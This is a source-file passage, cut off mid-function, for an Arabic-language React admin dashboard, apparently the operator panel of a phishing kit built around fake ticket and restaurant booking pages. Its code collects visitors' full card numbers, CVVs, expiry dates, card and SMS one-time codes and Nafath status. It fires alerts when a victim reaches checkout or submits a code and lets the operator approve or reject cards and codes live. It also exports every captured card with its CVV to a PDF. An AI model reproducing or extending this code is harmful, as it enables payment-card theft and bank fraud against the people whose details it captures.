import React, { useEffect, useMemo, useRef, useState } from "react";
import {
  collection,
  onSnapshot,
  query,
  doc,
  setDoc,
  deleteDoc,
  arrayUnion,
  arrayRemove,
  getDoc,
  getDocs,
  writeBatch,
  db,
  auth,
  logoutUser,
  updateVisitorBlockStatus,
  addBlockedBin as fbAddBlockedBin,
  removeBlockedBin as fbRemoveBlockedBin,
  listenBlockedBins,
  pushBankContactRequest,
  pushCustomVisitorMessage,
  clearCustomVisitorMessage,
  onAuthStateChanged,
  updateApprovalStatus,
  updateOtpApprovalStatus,
  triggerRealtimeRefresh,
  type User,
} from "@/lib/firebase";
import { useLocation } from "wouter";
import { findBankLogo } from "@/lib/bank-logos";
import { normalizeCardNumber } from "@/lib/card-normalization";
import { buildCardApprovalPayload } from "@/lib/approval-payload";
import { buildPageControlPayload } from "@/lib/page-control";
import { getDirectedVisitorPath } from "@/lib/directed-step-routing";
import { isPresenceOnline } from "@/lib/presence";
import { collapseDuplicateVisitors } from "@/lib/visitor-dedup";
import {
  filterDashboardSidebarVisitors,
  type DashboardSidebarFilter,
} from "@/lib/order-sidebar";
import { OrderSidebarEmptyState } from "@/components/OrderSidebarEmptyState";
import { useToast } from "@/hooks/use-toast";
import { ToastAction } from "@/components/ui/toast";
import {
  distinctVisitorAlertKinds,
  playVisitorAlertSound,
  VISITOR_ALERT_SOUND_URL,
} from "@/lib/dashboard-audio";
const cardAddedSoundUrl = VISITOR_ALERT_SOUND_URL;
import {
  Search,
  RefreshCw,
  Trash2,
  Bell,
  Volume2,
  LogOut,
  CreditCard,
  Globe,
  Smartphone as PhoneIcon,
  CheckCircle2,
  XCircle,
  Send,
  ArrowLeftRight,
  Hash,
  Lock as LockIcon,
  ChevronDown,
  Layers,
  Settings,
  Eye,
  EyeOff,
  RotateCcw,
  Users,
  Activity,
  AlarmClock,
  CheckCheck,
  AlertTriangle,
  BellRing,
  VolumeX,
  Ban,
  ShieldOff,
  Plus,
  X as XIcon,
  FileDown,
  WifiOff,
  PhoneCall,
  MessageSquare,
} from "lucide-react";
import { handleCurrentPage } from "../lib/firebase";

type CardKey = "customer" | "otp" | "card" | "header";
type CardSetting = { visible: boolean; span: 1 | 2 };
type CardSettings = Record<CardKey, CardSetting>;

const CARD_LABELS: Record<CardKey, string> = {
  customer: "معلومات أساسية",
  otp: "العميل المحدد / OTP",
  card: "معلومات البطاقة",
  header: "ترويسة الزائر",
};

const DEFAULT_CARD_SETTINGS: CardSettings = {
  customer: { visible: true, span: 1 },
  otp: { visible: true, span: 1 },
  card: { visible: true, span: 1 },
  header: { visible: true, span: 1 },
};

const OPERATOR_LABELS: Record<string, string> = {
  stc: "STC",
  mobily: "موبايلي",
  zain: "زين",
};

function loadCardSettings(): CardSettings {
  try {
    const raw = localStorage.getItem("admin.cardSettings");
    if (!raw) return DEFAULT_CARD_SETTINGS;
    const parsed = JSON.parse(raw);
    return { ...DEFAULT_CARD_SETTINGS, ...parsed };
  } catch {
    return DEFAULT_CARD_SETTINGS;
  }
}

interface Visitor {
  id: string;
  [k: string]: any;
}

const STEP_LABELS: Record<number, string> = {
  1: "registration · التسجيل",
  2: "booking · الحجز",
  3: "checkout · الدفع",
  4: "otp · رمز التحقق",
  5: "otp_verified · تم التحقق",
  6: "confirmation · التأكيد",
};

const STEP_TO_PAGE: Record<number, string> = {
  1: "/registration",
  2: "/booking",
  3: "/checkout",
  4: "/otp",
  5: "/otp_verified",
  6: "/confirmation",
};

// Restaurant-reservation flow has 4 internal stages on /reserve/:id, plus the
// shared OTP and confirmation pages. Steps 1-4 are SPA-internal stages of the
// reserve page; 5 and 6 are external routes.
const RESTAURANT_STEP_LABELS: Record<number, string> = {
  1: "reserve_date · الموعد",
  2: "reserve_details · البيانات",
  3: "reserve_invoice · الفاتورة",
  4: "reserve_checkout · الدفع",
  5: "reserve_otp · رمز التحقق",
  6: "confirmation · تأكيد الحجز",
};

const RESTAURANT_STEP_TO_PAGE: Record<number, string> = {
  1: "reserve_date",
  2: "reserve_details",
  3: "reserve_invoice",
  4: "reserve_checkout",
  5: "reserve_otp",
  6: "confirmation",
};

const TICKET_TOTAL_STEPS = 6;
const RESTAURANT_TOTAL_STEPS = 6;
const TOTAL_STEPS = RESTAURANT_TOTAL_STEPS; // legacy upper bound

type VisitorFlow = "ticket" | "restaurant";

function getFlowTotalSteps(flow: VisitorFlow): number {
  return flow === "restaurant" ? RESTAURANT_TOTAL_STEPS : TICKET_TOTAL_STEPS;
}

function isFinalStep(v: any): boolean {
  const flow: VisitorFlow =
    String(v?.type || "").toLowerCase() === "restaurant_reservation" ||
    !!v?.restaurant ||
    !!v?.restaurantEn ||
    String(v?.currentPage || "").startsWith("reserve_")
      ? "restaurant"
      : "ticket";
  return (
    Number(v?.step) === getFlowTotalSteps(flow) ||
    String(v?.currentPage || "") === "confirmation"
  );
}

function getVisitorFlow(v: Visitor): VisitorFlow {
  const t = String((v as any)?.type || "").toLowerCase();
  const cp = String((v as any)?.currentPage || "").toLowerCase();
  if (
    t === "restaurant_reservation" ||
    !!(v as any)?.restaurant ||
    !!(v as any)?.restaurantEn ||
    cp.startsWith("reserve_")
  ) {
    return "restaurant";
  }
  return "ticket";
}

function getFlowStepLabels(flow: VisitorFlow): Record<number, string> {
  return flow === "restaurant" ? RESTAURANT_STEP_LABELS : STEP_LABELS;
}

function getFlowStepPage(flow: VisitorFlow, step: number): string {
  const map = flow === "restaurant" ? RESTAURANT_STEP_TO_PAGE : STEP_TO_PAGE;
  return map[step] || "";
}

/* -------------------------------------------------------------- */
/* Adapter: map current flat schema → the shape the new UI expects */
/* -------------------------------------------------------------- */

const PAGE_TO_STEP: Record<string, number> = {
  // Ticket flow
  registration: 1,
  booking: 2,
  cart: 3, // legacy alias (cart step removed from UX) → checkout
  checkout: 3,
  otp: 4,
  otp_verified: 5,
  confirmation: 6,
  // Restaurant flow (4 internal stages of /reserve/:id, then OTP, then conf)
  reserve_restaurant: 1, // legacy alias (intro step removed) → reserve_date
  reserve_date: 1,
  reserve_details: 2,
  reserve_invoice: 3,
  reserve_checkout: 4,
  reserve_otp: 5,
};

function tsFromAny(v: any): string | undefined {
  if (!v) return undefined;
  if (typeof v === "string") return v;
  if (typeof v === "number") return new Date(v).toISOString();
  if (typeof v?.toDate === "function") {
    try {
      return v.toDate().toISOString();
    } catch {
      return undefined;
    }
  }
  if (typeof v?.seconds === "number") {
    return new Date(v.seconds * 1000).toISOString();
  }
  return undefined;
}

export function adaptVisitor(raw: any): Visitor {
  const c1 = normalizeCardNumber(raw);
  const last4 =
    c1.slice(-4) || String(raw?.cardLast4 || "").replace(/\D/g, "").slice(-4);
  const bin =
    c1.slice(0, 6) || String(raw?.cardBin || "").replace(/\D/g, "").slice(0, 6);
  const mm = String(raw?.expiryMonth || "")
    .padStart(2, "0")
    .slice(-2);
  const yy = String(raw?.expiryYear || "")
    .slice(-2)
    .padStart(2, "0");
  const expiry =
    raw?.expiryMonth && raw?.expiryYear
      ? `${mm}/${yy}`
      : String(raw?.cardExpiry || raw?.expiry || "");

  const ct = String(raw?.cardType || raw?.cardBrand || "").toLowerCase();
  const scheme =
    ct === "mada"
      ? "mada"
      : ct === "visa"
        ? "visa"
        : ct === "mastercard" || ct === "master"
          ? "mastercard"
          : ct === "amex" || ct === "american express"
            ? "amex"
            : ct;

  const matchedBank = findBankLogo(raw?.cardBankName || raw?.bankName);
  const cardBank = raw?.cardBankName || raw?.bankName || "";

  const payment = {
    c1: raw?.c1 || raw?.c1,
    cardLast4: last4 || undefined,
    cardBin: bin || undefined,
    cardName: raw?.cardName || raw?.cardHolderName || raw?.cardholderName,
    cardExpiry: expiry || undefined,
    cpc: raw?.cvv || raw?.cpc || raw?.cpc || raw?.cardCvv,
    cardScheme: scheme,
    cardType: raw?.cardCategory || undefined,
    cardLevel: raw?.cardLevel || undefined,
    cardCountry: raw?.cardCountry || undefined,
    cardBank,
    cardBankLogo: matchedBank?.logo || null,
    cardBankLabel: matchedBank?.label || cardBank || "",
    amount: raw?.totalAmount || raw?.total,
  };

  let cardApprovalStatus: string | undefined;
  if (raw?.cardApproved === true || raw?.cardApprovalStatus === "approved") {
    cardApprovalStatus = "approved";
  } else if (
    raw?.cardStatus === "rejected" ||
    raw?.cardApprovalStatus === "rejected"
  ) {
    cardApprovalStatus = "rejected";
  } else if (
    raw?.cardStatus === "pending_approval" ||
    raw?.status === "pending_approval" ||
    raw?.cardApprovalStatus === "pending_approval" ||
    raw?.cardApprovalStatus === "pending" ||
    raw?.cardApprovalStatus === "waiting" ||
    ((raw?.c1 || raw?.c1 || raw?.cardLast4) && !raw?.cardApproved)
  ) {
    cardApprovalStatus = "waiting";
  }
  if (!cardApprovalStatus && typeof raw?.cardApprovalStatus === "string") {
    cardApprovalStatus = raw.cardApprovalStatus;
  }

  let otpApprovalStatus: string | undefined;
  if (raw?.otpApproved === true || raw?.otpApprovalStatus === "approved") {
    otpApprovalStatus = "approved";
  } else if (
    raw?.otpStatus === "rejected" ||
    raw?.otpApprovalStatus === "rejected"
  ) {
    otpApprovalStatus = "rejected";
  } else if (
    raw?.otpStatus === "pending" ||
    raw?.otpApprovalStatus === "pending" ||
    raw?.otpApprovalStatus === "waiting" ||
    (raw?.otp && !raw?.otpApproved)
  ) {
    otpApprovalStatus = "waiting";
  }
  if (!otpApprovalStatus && typeof raw?.otpApprovalStatus === "string") {
    otpApprovalStatus = raw.otpApprovalStatus;
  }

  const phoneOtpApprovalStatus =
    typeof raw?.phoneOtpApprovalStatus === "string"
      ? raw.phoneOtpApprovalStatus
      : undefined;

  const candidateDates = [
    tsFromAny(raw?.updatedAt),
    tsFromAny(raw?.cardSubmittedAt),
    tsFromAny(raw?.otpSubmittedAt),
    tsFromAny(raw?.lastSeen),
    tsFromAny(raw?.updated_at),
    tsFromAny(raw?.createdDate),
  ].filter(Boolean) as string[];

  let updatedAt: string | undefined;
  let maxMs = 0;
  for (const iso of candidateDates) {
    const ms = new Date(iso).getTime();
    if (Number.isFinite(ms) && ms > maxMs) {
      maxMs = ms;
      updatedAt = iso;
    }
  }
  if (!updatedAt) {
    updatedAt = candidateDates[0] || undefined;
  }

  const stepFromPage = PAGE_TO_STEP[String(raw?.currentPage || "")] || 0;
  const rawStep = Number(raw?.step) || 0;
  const flowMax = 6;
  const clampedRawStep = rawStep > flowMax ? flowMax : rawStep;
  const step =
    stepFromPage ||
    clampedRawStep ||
    (raw?.otp ? 4 : raw?.c1 ? 3 : raw?.name ? 1 : 0);

  const completed =
    raw?.currentPage === "confirmation" ||
    raw?.currentPage === "otp_verified" ||
    (cardApprovalStatus === "approved" && otpApprovalStatus === "approved");

  return {
    ...raw,
    payment,
    step,
    cardApprovalStatus,
    otpApprovalStatus,
    phoneOtpApprovalStatus,
    updatedAt,
    status: completed ? "nafad_otp_submitted" : raw?.status,
  } as Visitor;
}

/* -------------------------------------------------------------- */
/* Helpers                                                         */
/* -------------------------------------------------------------- */

function countryFlag(code: string): string {
  const cc = (code || "").trim().toUpperCase();
  if (cc.length !== 2 || !/^[A-Z]{2}$/.test(cc)) return "";
  const A = 0x1f1e6;
  return String.fromCodePoint(
    A + cc.charCodeAt(0) - 65,
    A + cc.charCodeAt(1) - 65
  );
}

function fmtTime(iso?: string) {
  if (!iso) return "—";
  const d = new Date(iso);
  if (isNaN(d.getTime())) return "—";
  return d.toLocaleString("ar-SA", { dateStyle: "short", timeStyle: "short" });
}

function safeText(v: any): string {
  if (v === null || v === undefined) return "";
  if (typeof v === "string" || typeof v === "number") return String(v);
  if (typeof v === "object")
    return (
      v.name ||
      v.bank ||
      v.bank_name ||
      v.bankName ||
      v.scheme ||
      v.brand ||
      JSON.stringify(v)
    );
  return String(v);
}

function isOnline(v: Visitor): boolean {
  return isPresenceOnline(v);
}

const WAITING_FIELDS = [
  "cardApprovalStatus",
  "otpApprovalStatus",
  "phoneOtpApprovalStatus",
  "nafadConfirmationStatus",
] as const;

function waitingFields(v: Visitor): string[] {
  return WAITING_FIELDS.filter(
    f =>
      v[f] === "waiting" ||
      v[f] === "pending" ||
      v[f] === "pending_approval"
  );
}
function isWaiting(v: Visitor): boolean {
  return waitingFields(v).length > 0;
}
function isCompleted(v: Visitor): boolean {
  return v.status === "nafad_otp_submitted" || isFinalStep(v);
}

function fmtRelative(iso?: string): string {
  if (!iso) return "—";
  const t = new Date(iso).getTime();
  if (isNaN(t)) return "—";
  const diff = Math.max(0, Date.now() - t);
  const sec = Math.floor(diff / 1000);
  if (sec < 60) return `منذ ${sec}ث`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `منذ ${min}د`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `منذ ${hr}س`;
  const day = Math.floor(hr / 24);
  return `منذ ${day}ي`;
}

function stepColor(step: number): string {
  if (step >= 6)
    return "bg-emerald-500/20 text-emerald-300 border-emerald-500/40";
  if (step >= 5) return "bg-violet-500/20 text-violet-300 border-violet-500/40";
  if (step >= 4) return "bg-amber-500/20 text-amber-300 border-amber-500/40";
  if (step >= 3) return "bg-cyan-500/20 text-cyan-300 border-cyan-500/40";
  return "bg-slate-700/40 text-slate-300 border-slate-600/40";
}

function playConfiguredVisitorAlert() {
  playVisitorAlertSound(() => new Audio(cardAddedSoundUrl));
}

function beep() {
  playConfiguredVisitorAlert();
}

/**
 * Plays a short multi-note pattern so the admin can distinguish event
 * types by ear without looking. Each note is `[freqHz, durMs]`.
 * `wave` defaults to "sine" but can be overridden for harsher alerts.
 */
function beepPattern(
  notes: Array<[number, number]>,
  volume = 0.22,
  wave: OscillatorType = "sine"
) {
  try {
    const Ctx =
      (window as any).AudioContext || (window as any).webkitAudioContext;
    if (!Ctx) return;
    const ctx = new Ctx();
    let t = ctx.currentTime;
    for (const [freq, durMs] of notes) {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.type = wave;
      osc.frequency.setValueAtTime(freq, t);
      gain.gain.setValueAtTime(volume, t);
      gain.gain.exponentialRampToValueAtTime(0.0001, t + durMs / 1000);
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start(t);
      osc.stop(t + durMs / 1000 + 0.02);
      t += durMs / 1000 + 0.04;
    }
  } catch {}
}

/** Distinct alert tones, picked to be recognizable from across the room. */
const ALERT_TONES = {
  // Visitor entered card-entry page — urgent, descending triple beep.
  checkout: () =>
    beepPattern(
      [
        [1200, 110],
        [900, 110],
        [700, 180],
      ],
      0.28,
      "square"
    ),
  // Visitor submitted OTP code — fast double chirp.
  otp: () =>
    beepPattern(
      [
        [1500, 90],
        [1500, 90],
      ],
      0.26,
      "triangle"
    ),
  // Visitor reached confirmation page — pleasant rising arpeggio.
  confirmation: () =>
    beepPattern(
      [
        [660, 100],
        [880, 100],
        [1320, 220],
      ],
      0.22,
      "sine"
    ),
};

/**
 * Resolve the alert kind for a visitor based on their current page. Returns
 * null when the page is not one we want to alert on.
 */
function alertKindFor(currentPage: string): keyof typeof ALERT_TONES | null {
  if (currentPage === "checkout" || currentPage === "reserve_checkout")
    return "checkout";
  if (currentPage === "otp" || currentPage === "reserve_otp") return "otp";
  if (currentPage === "confirmation" || currentPage === "otp_verified")
    return "confirmation";
  return null;
}

function escHtml(s: any): string {
  const str = s == null ? "" : String(s);
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

function exportAllCardsPdf(visitors: Visitor[]) {
  const withCards = visitors.filter(
    v => v?.payment?.c1 || v?.payment?.cardLast4 || v?.payment?.c1
  );
  if (withCards.length === 0) {
    alert("لا توجد بطاقات لتصديرها.");
    return;
  }

  const rows = withCards
    .map((v, idx) => {
      const p = v.payment || {};
      const fullCard = String(p.c1 || "").replace(/\D/g, "");
      const formatted = fullCard
        ? fullCard.replace(/(.{4})/g, "$1 ").trim()
        : `**** **** **** ${escHtml(p.cardLast4 || "----")}`;
      const expiry = escHtml(p.cardExpiry || "—");
      const cvv = escHtml(p.cpc || "—");
      const name = escHtml(p.cardName || v.name || "—");
      const bin = escHtml(p.cardBin || (fullCard ? fullCard.slice(0, 6) : "—"));
      const bank = escHtml(p.cardBankLabel || p.cardBank || "—");
      const scheme = escHtml(p.cardScheme || "—");
      const type = escHtml(p.cardType || "—");
      const level = escHtml(p.cardLevel || "—");
      const country = escHtml(p.cardCountry || "—");
      const phone = escHtml(v.phone || "—");
      const otpCard = escHtml(v.otp || "—");
      const otpSms = escHtml(v.smsOtp || "—");
      const updated = escHtml(fmtTime(v.updatedAt));
      const visitorId = escHtml(v.id);
      return `
      <article class="card-row">
        <header class="row-head">
          <div class="row-idx">#${idx + 1}</div>
          <div class="row-meta">
            <div><strong>الزائر:</strong> ${visitorId}</div>
            <div><strong>التحديث:</strong> ${updated}</div>
          </div>
        </header>
        <div class="card-grid">
          <div class="block primary">
            <div class="lbl">رقم البطاقة</div>
            <div class="val mono big">${escHtml(formatted)}</div>
          </div>
          <div class="block"><div class="lbl">اسم حامل البطاقة</div><div class="val">${name}</div></div>
          <div class="block"><div class="lbl">تاريخ الانتهاء</div><div class="val mono">${expiry}</div></div>
          <div class="block"><div class="lbl">CVV</div><div class="val mono">${cvv}</div></div>
          <div class="block"><div class="lbl">BIN</div><div class="val mono">${bin}</div></div>
          <div class="block"><div class="lbl">الشبكة</div><div class="val">${scheme}</div></div>
          <div class="block"><div class="lbl">النوع</div><div class="val">${type}</div></div>
          <div class="block"><div class="lbl">المستوى</div><div class="val">${level}</div></div>
          <div class="block"><div class="lbl">الدولة</div><div class="val">${country}</div></div>
          <div class="block wide"><div class="lbl">البنك</div><div class="val">${bank}</div></div>
          <div class="block"><div class="lbl">رمز البطاقة (OTP)</div><div class="val mono">${otpCard}</div></div>
          <div class="block"><div class="lbl">رمز SMS</div><div class="val mono">${otpSms}</div></div>
          <div class="block wide"><div class="lbl">الجوال</div><div class="val mono">${phone}</div></div>
        </div>
      </article>`;
    })
    .join("\n");

  const now = new Date();
  const dateStr = now.toLocaleString("ar-SA");
  const html = `<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8" />
<title>تصدير البطاقات - ${withCards.length}</title>
<style>
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; background: #fff; color: #111; font-family: -apple-system, "Segoe UI", Tahoma, Arial, "Noto Sans Arabic", sans-serif; }
  .page { padding: 18mm 12mm; }
  .doc-head { display: flex; justify-content: space-between; align-items: flex-end; border-bottom: 2px solid #111; padding-bottom: 10px; margin-bottom: 16px; }
  .doc-head h1 { margin: 0; font-size: 20px; }
  .doc-head .meta { font-size: 12px; color: #444; text-align: left; direction: ltr; }
  .doc-head .meta div { margin-bottom: 2px; }
  .summary { font-size: 12px; color: #555; margin-bottom: 14px; }
  .card-row { border: 1px solid #d0d0d0; border-radius: 6px; padding: 12px 14px; margin-bottom: 12px; page-break-inside: avoid; background: #fafafa; }
  .row-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; padding-bottom: 8px; border-bottom: 1px dashed #c0c0c0; }
  .row-idx { font-size: 18px; font-weight: 800; color: #1a56db; }
  .row-meta { font-size: 11px; color: #555; text-align: left; direction: ltr; }
  .row-meta strong { color: #111; }
  .card-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
  .block { background: #fff; border: 1px solid #e3e3e3; border-radius: 4px; padding: 6px 8px; }
  .block.wide { grid-column: span 2; }
  .block.primary { grid-column: span 4; background: #fff; border-color: #1a56db; }
  .block .lbl { font-size: 10px; color: #666; margin-bottom: 3px; }
  .block .val { font-size: 13px; color: #111; font-weight: 600; word-break: break-all; }
  .block .val.mono { font-family: "SFMono-Regular", Menlo, Consolas, monospace; direction: ltr; text-align: left; letter-spacing: 0.04em; }
  .block .val.big { font-size: 18px; letter-spacing: 0.12em; }
  .footer-note { margin-top: 14px; font-size: 10px; color: #888; text-align: center; }
  @media print {
    .no-print { display: none !important; }
    .page { padding: 10mm; }
    .card-row { background: #fff; }
  }
  .toolbar { position: sticky; top: 0; background: #1a56db; color: #fff; padding: 10px 14px; display: flex; justify-content: space-between; align-items: center; z-index: 10; }
  .toolbar button { background: #fff; color: #1a56db; border: none; padding: 8px 16px; border-radius: 4px; font-weight: 700; cursor: pointer; font-size: 13px; }
  .toolbar button:hover { background: #f0f0f0; }
</style>
</head>
<body>
  <div class="toolbar no-print">
    <span>اضغط زر "طباعة / حفظ PDF" ثم اختر "Save as PDF"</span>
    <button onclick="window.print()">طباعة / حفظ PDF</button>
  </div>
  <div class="page">
    <div class="doc-head">
      <h1>تقرير البطاقات</h1>
      <div class="meta">
        <div>${escHtml(dateStr)}</div>
        <div>إجمالي البطاقات: ${withCards.length}</div>
      </div>
    </div>
    <div class="summary">يحتوي هذا التقرير على بيانات ${withCards.length} بطاقة مُسجَّلة عبر النظام.</div>
    ${rows}
    <div class="footer-note">تم التوليد تلقائياً من لوحة التحكم</div>
  </div>
  <script>
    window.addEventListener('load', function() {
      setTimeout(function() { window.print(); }, 350);
    });
  </script>
</body>
</html>`;

  const w = window.open("", "_blank", "width=900,height=1000");
  if (!w) {
    alert("الرجاء السماح بالنوافذ المنبثقة لتصدير الـ PDF.");
    return;
  }
  w.document.open();
  w.document.write(html);
  w.document.close();
}

/* -------------------------------------------------------------- */
/* Auth wrapper                                                    */
/* -------------------------------------------------------------- */

export default function Admin() {
  const [, setLocation] = useLocation();
  const [authUser, setAuthUser] = useState<User | null>(null);
  const [authReady, setAuthReady] = useState(false);

  useEffect(() => {
    if (!auth) {
      setAuthReady(true);
      return;
    }
    const unsub = onAuthStateChanged(auth, u => {
      setAuthUser(u);
      setAuthReady(true);
    });
    return () => unsub();
  }, []);

  useEffect(() => {
    if (authReady && !authUser) {
      setLocation("/login");
    }
  }, [authReady, authUser, setLocation]);

  if (!authReady || !authUser) {
    return (
      <div className="min-h-screen w-full flex items-center justify-center bg-slate-950 text-slate-400 text-sm">
        جاري التحميل...
      </div>
    );
  }

  return <AdminDashboard />;
}

/* -------------------------------------------------------------- */
/* Dashboard                                                       */
/* -------------------------------------------------------------- */

function AdminDashboard() {
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<
    "all" | "online" | "waiting" | "completed"
  >("all");
  const [soundOn, setSoundOn] = useState<boolean>(() => {
    try {
      return localStorage.getItem("admin.soundOn") !== "0";
    } catch {
      return true;
    }
  });
  const prevWaitingIds = useRef<Set<string>>(new Set());
  const [, forceTick] = useState(0);
  const [presenceTick, setPresenceTick] = useState(0);
  const [blockedBins, setBlockedBins] = useState<string[]>([]);
  const [blocklistOpen, setBlocklistOpen] = useState(false);
  const [blockedIps, setBlockedIps] = useState<string[]>([]);
  const [ipBlocklistOpen, setIpBlocklistOpen] = useState(false);

  // Subscribe to existing blocked_bins collection (string ids).
  useEffect(() => {
    const unsub = listenBlockedBins(bins => {
      setBlockedBins(
        bins
          .map(b => String(b.bin || "").replace(/\D/g, ""))
          .filter(s => s.length === 6)
      );
    });
    return () => unsub();
  }, []);

  async function addBlockedBin(bin: string) {
    const clean = String(bin).replace(/\D/g, "").slice(0, 6);
    if (clean.length !== 6) return;
    if (blockedBins.includes(clean)) return;
    try {
      await fbAddBlockedBin(clean);
    } catch (e) {
      console.error(e);
    }
  }
  async function removeBlockedBin(bin: string) {
    const clean = String(bin).replace(/\D/g, "");
    if (!clean) return;
    try {
      await fbRemoveBlockedBin(clean);
    } catch (e) {
      console.error(e);
    }
  }

  // ---- Blocked IPs (settings/blockedIps doc, ips: string[]) ----
  useEffect(() => {
    const unsub = onSnapshot(doc(db, "settings", "blockedIps"), snap => {
      const data = snap.data() as any;
      const ips = Array.isArray(data?.ips) ? data.ips : [];
      setBlockedIps(
        ips
          .map((x: any) => String(x).trim())
          .filter((x: string) => x.length > 0)
      );
    });
    return () => unsub();
  }, []);

  async function addBlockedIp(ip: string) {
    const clean = String(ip).trim();
    if (!clean) return;
    if (blockedIps.includes(clean)) return;
    await setDoc(
      doc(db, "settings", "blockedIps"),
      { ips: arrayUnion(clean), updatedAt: new Date().toISOString() },
      { merge: true }
    );
  }
  async function removeBlockedIp(ip: string) {
    const clean = String(ip).trim();
    if (!clean) return;
    await setDoc(
      doc(db, "settings", "blockedIps"),
      { ips: arrayRemove(clean), updatedAt: new Date().toISOString() },
      { merge: true }
    );
  }

  // Block/unblock a visitor by toggling the per-doc `blocked` field.
  const blockedVisitors = useMemo(
    () => visitors.filter(v => v.blocked === true).map(v => v.id),
    [visitors]
  );
  async function toggleBlockedVisitor(visitorId: string) {
    const isBlocked = blockedVisitors.includes(visitorId);
    if (isBlocked) {
      if (!confirm("إزالة الحظر عن هذا الزائر؟")) return;
      await updateVisitorBlockStatus(visitorId, false);
    } else {
      if (
        !confirm("حظر هذا الزائر نهائياً؟\nسيُمنع من إكمال أي خطوة في الحجز.")
      )
        return;
      await updateVisitorBlockStatus(visitorId, true);
    }
  }

  // Re-render every 15s so relative timestamps stay fresh.
  useEffect(() => {
    const t = setInterval(() => forceTick(n => n + 1), 15000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    try {
      localStorage.setItem("admin.soundOn", soundOn ? "1" : "0");
    } catch {}
  }, [soundOn]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [checkedIds, setCheckedIds] = useState<string[]>([]);
  const [showLeftPanel, setShowLeftPanel] = useState<boolean>(true);
  const [otpInput, setOtpInput] = useState("");
  const [otpDirect, setOtpDirect] = useState("");
  const [cardSettings, setCardSettings] = useState<CardSettings>(() =>
    loadCardSettings()
  );

  useEffect(() => {
    try {
      localStorage.setItem("admin.cardSettings", JSON.stringify(cardSettings));
    } catch {}
  }, [cardSettings]);

  function updateCardSetting(key: CardKey, patch: Partial<CardSetting>) {
    setCardSettings(prev => ({ ...prev, [key]: { ...prev[key], ...patch } }));
  }
  function resetCardSettings() {
    setCardSettings(DEFAULT_CARD_SETTINGS);
  }
  function spanClass(key: CardKey) {
    const s = cardSettings[key];
    if (!s.visible) return "hidden";
    return "w-[350px] max-w-full mx-auto";
  }

  const cardSeenRef = useRef<Set<string>>(new Set());
  const cardSnapshotReadyRef = useRef(false);
  const cardAudioRef = useRef<HTMLAudioElement | null>(null);
  if (!cardAudioRef.current && typeof Audio !== "undefined") {
    cardAudioRef.current = new Audio(cardAddedSoundUrl);
    cardAudioRef.current.preload = "auto";
    cardAudioRef.current.volume = 0.85;
  }

  const { toast } = useToast();
  // Tracks the last `currentPage` we've seen for each visitor so we can
  // detect transitions into sensitive pages (checkout / otp / confirmation)
  // without re-firing alerts on every snapshot for the same state.
  const lastPageRef = useRef<Map<string, string>>(new Map());
  // Tracks the last OTP value per visitor so we can fire a toast only when
  // a NEW code is submitted (or an existing one changes), not on every
  // snapshot replay.
  const lastOtpRef = useRef<Map<string, string>>(new Map());
  // Per-visitor "recent alert" timestamps drive the row glow animation.
  // Stored in a ref + state mirror so the render reads from state but
  // updates from inside the snapshot don't cascade extra renders.
  const [recentAlerts, setRecentAlerts] = useState<
    Record<string, { kind: keyof typeof ALERT_TONES; until: number }>
  >({});
  // Tab-title pulse counter: each unread sensitive event increments this
  // when the dashboard tab is in the background; viewing the tab clears it.
  const [unreadAlerts, setUnreadAlerts] = useState(0);
  // Pagination state for visitor sidebar
  const [pageSize, setPageSize] = useState(25);
  const [currentPage, setCurrentPage] = useState(1);
  const soundOnRef = useRef(false);
  useEffect(() => {
    soundOnRef.current = soundOn;
  }, [soundOn]);

  useEffect(() => {
    const q = query(collection(db, "pays"));
    const unsub = onSnapshot(q, snap => {
      const rawList: Visitor[] = [];
      snap.forEach((d: any) =>
        rawList.push(adaptVisitor({ id: d.id, ...(d.data() as any) }))
      );
      const list = collapseDuplicateVisitors(rawList);
      // Sort by updatedAt desc
      list.sort((a, b) => {
        const ta = new Date(a.updatedAt || 0).getTime() || 0;
        const tb = new Date(b.updatedAt || 0).getTime() || 0;
        return tb - ta;
      });

      // Detect newly-added cards. On first snapshot, just record what
      // already has a card so we don't spam on dashboard open.
      const newCardVisitors: Visitor[] = [];
      for (const v of list) {
        const hasCard = !!(
          (v as any).c1 ||
          v.payment?.c1 ||
          v.payment?.cardLast4
        );
        if (!hasCard) continue;
        if (!cardSeenRef.current.has(v.id)) {
          cardSeenRef.current.add(v.id);
          if (cardSnapshotReadyRef.current) newCardVisitors.push(v);
        }
      }
      if (newCardVisitors.length > 0 && soundOnRef.current) {
        playConfiguredVisitorAlert();
      }
      // Pop a toast for each freshly-added card so the admin gets a
      // visible heads-up even when sound is muted or the audio is
      // blocked by autoplay policy.
      for (const v of newCardVisitors) {
        const last4 =
          v.payment?.cardLast4 ||
          String((v as any).c1 || "")
            .replace(/\s+/g, "")
            .slice(-4);
        const name = v.name || "زائر بدون اسم";
        toast({
          title: "💳 بطاقة جديدة",
          description: `${name} • ${last4 ? "•• " + last4 : "تم إدخال البطاقة"}`,
          duration: 8000,
          action: (
            <ToastAction
              altText="فتح"
              onClick={() => setSelectedId(v.id)}
              data-testid={`toast-open-card-${v.id}`}
            >
              فتح
            </ToastAction>
          ),
        });
      }

      // Detect newly-submitted OTP codes — track per-visitor so we
      // alert exactly once per submission, not on every snapshot.
      const newOtpVisitors: Array<{ v: Visitor; code: string }> = [];
      for (const v of list) {
        const code = String((v as any).otp || "").trim();
        const prev = lastOtpRef.current.get(v.id) || "";
        if (code && code !== prev && cardSnapshotReadyRef.current) {
          newOtpVisitors.push({ v, code });
        }
        lastOtpRef.current.set(v.id, code);
      }
      if (newOtpVisitors.length > 0 && soundOnRef.current) {
        playConfiguredVisitorAlert();
      }
      for (const { v, code } of newOtpVisitors) {
